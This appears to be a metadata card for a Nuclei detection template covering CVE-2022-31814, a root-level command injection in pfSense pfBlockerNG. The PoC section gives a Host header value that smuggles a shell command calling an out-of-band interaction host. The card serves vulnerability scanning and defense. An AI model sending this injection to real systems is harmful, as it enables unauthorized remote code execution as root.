---
cve_id: CVE-2022-31814
template_path: nuclei-templates/http/cves/2022/CVE-2022-31814.yaml
affected_product: pfSense pfBlockerNG
severity: critical
authentication: none
external_callback: true
affected_versions: through 2.1.4_26 (3.x unaffected)
preconditions: pfBlockerNG package installed on pfSense
poc_classification: rce
---

## Vulnerability
pfSense pfBlockerNG through 2.1.4_26 is susceptible to OS command injection via shell metacharacters in the HTTP Host header (executed as root). 3.x versions are unaffected. Successful exploitation allows remote unauthenticated attackers to execute arbitrary OS commands on the affected system. CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (score 9.8). CWE-78.

## PoC / Detection
Classification: rce

The template sends two raw unsafe GET requests to `/pfblockerng/www/index.php`. The first baseline request (Host: {{Hostname}}) verifies the endpoint by matching "GIF" in body_1. The second request injects Host: ' *; host {{interactsh-url}}; ' to trigger command execution, confirmed by a DNS interaction matcher on interactsh_protocol.

## References
- https://www.ihteam.net/advisory/pfblockerng-unauth-rce-vulnerability/
- https://docs.netgate.com/pfsense/en/latest/packages/pfblocker.html
- https://github.com/EvergreenCartoons/SenselessViolence
- https://nvd.nist.gov/vuln/detail/CVE-2022-31814
- http://packetstormsecurity.com/files/171123/pfBlockerNG-2.1.4_26-Remote-Code-Execution.html
